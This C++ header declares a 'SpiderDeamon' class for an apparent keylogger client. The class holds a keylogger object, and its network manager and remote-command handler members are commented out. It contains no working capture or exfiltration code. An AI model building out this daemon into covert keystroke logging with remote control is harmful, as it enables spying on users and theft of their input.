//
// Created by etiennep on 11/8/16.
//

#ifndef SPIDER_CLIENT_SPIDERDEAMON_HPP
#define SPIDER_CLIENT_SPIDERDEAMON_HPP

#include "ISpiderDeamon.hpp"
#include "ISpiderNetworkManager.hpp"
#include "SpiderNetworkManager.hpp"
#include "ISpiderMessageDeserializer.hpp"
#include "SpiderMessageDeserializer.hpp"
#include "ISpiderCommandHandler.hpp"
#include "SpiderCommandHandler.hpp"
#include "ISpiderKeyLogger.hpp"
#include "SpiderKeyLogger.hpp"

class SpiderDeamon : public ISpiderDeamon {
private:
	//std::unique_ptr<ISpiderNetworkManager> NetworkManager = std::unique_ptr<ISpiderNetworkManager>(new SpiderNetworkManager());
	//std::unique_ptr<ISpiderMessageDeserializer> MessageDeserializer = std::unique_ptr<ISpiderMessageDeserializer>(new SpiderMessageDeserializer());
	//std::unique_ptr<ISpiderCommandHandler> CommandHandler = std::unique_ptr<ISpiderCommandHandler>(new SpiderCommandHandler());
	std::unique_ptr<ISpiderKeyLogger> KeyLogger = std::unique_ptr<ISpiderKeyLogger>(new SpiderKeyLogger());
};

#endif //SPIDER_CLIENT_SPIDERDEAMON_HPP